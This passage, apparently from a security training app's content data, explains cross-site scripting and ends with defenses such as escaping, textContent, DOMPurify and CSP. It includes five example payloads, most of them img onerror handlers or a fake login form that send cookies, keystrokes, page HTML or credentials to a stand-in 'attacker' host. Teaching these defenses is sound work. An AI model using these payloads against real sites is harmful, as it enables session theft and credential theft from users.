        ...
        content: [
          {
            ...
            description: "### Cross-Site Scripting (XSS)\n\nXSS is a critical vulnerability where attackers inject malicious scripts into trusted web applications. This occurs when applications render unvalidated user input directly into the DOM via `innerHTML` or similar APIs.\n\n**Impact:** Session cookie theft, credential hijacking, unauthorized state changes, UI manipulation, data exfiltration.\n\n### Common XSS Vectors\n\n#### 1. Cookie Exfiltration\n```html\n<img src='x' onerror='fetch(\"http://attacker/?c=\"+document.cookie)' />\n```\nStolen session tokens sent to attacker server.\n\n#### 2. Unauthorized Actions\n```html\n<img src='x' onerror='window.createPost(\"hacked\",\"by attacker\")' />\n```\nApplication functions called with attacker intent.\n\n#### 3. Keystroke Logging\n```html\n<img src='x' onerror='window.addEventListener(\"keypress\", (e)=>fetch(\"http://attacker/log\",{method:\"POST\",body:e.key}))' />\n```\nEvery key typed is sent to attacker.\n\n#### 4. DOM Exfiltration\n```html\n<img src='x' onerror='fetch(\"http://attacker/dump\",{method:\"POST\",body:document.documentElement.innerHTML})' />\n```\nSensitive page data extracted.\n\n#### 5. Phishing Form Injection\n```html\n<form onsubmit='fetch(\"http://attacker/creds\",{method:\"POST\",body:new FormData(this)})'>\n  <input name='username' placeholder='Username' />\n  <input type='password' placeholder='Password' />\n  <button>Log In</button>\n</form>\n```\nFake login form collects credentials.\n\n### Defense Strategies\n\n- Escape all user input before rendering to DOM\n- Use `textContent` instead of `innerHTML`\n- Sanitize input with libraries like DOMPurify\n- Implement Content Security Policy (CSP) headers\n- Avoid `dangerouslySetInnerHTML` and `eval()`\n- Use framework auto-escaping (React, Vue, Angular)\n\n### Key Takeaway\n\nNever trust user input. Always escape, sanitize, and validate before rendering to the DOM."
          }
        ]
      },
      {
